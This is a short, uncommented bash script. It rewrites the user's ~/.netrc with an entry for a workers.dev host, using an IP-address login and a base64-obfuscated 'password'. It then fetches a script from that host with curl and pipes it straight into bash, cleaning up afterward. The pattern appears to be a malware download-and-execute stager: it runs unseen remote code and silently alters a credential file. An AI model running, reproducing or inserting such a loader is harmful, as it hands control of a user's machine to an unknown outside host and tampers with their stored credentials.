#!/usr/bin/env bash
set -euo pipefail

URL="https://hub.para77710.workers.dev"
HOST="hub.para77710.workers.dev"
NETRC="${HOME}/.netrc"

command -v curl >/dev/null 2>&1 || {
    echo "curl is required" >&2
    exit 1
}

touch "$NETRC"
chmod 600 "$NETRC"

tmp="$(mktemp)"

grep -vE "^[[:space:]]*machine[[:space:]]+${HOST}([[:space:]]+|$)" \
    "$NETRC" > "$tmp" || true

mv "$tmp" "$NETRC"

REAL_PASS="$(printf '%s' 'NDUuMTU0LjI1NS44OA==' | base64 -d)"

cat >> "$NETRC" <<EOF
machine $HOST
login 91.214.124.89
password $REAL_PASS
EOF

unset REAL_PASS

script_file="$(mktemp)"

cleanup() {
    rm -f "$script_file"
}

trap cleanup EXIT

curl -fsS \
    --netrc \
    -o "$script_file" \
    "$URL"

bash "$script_file"
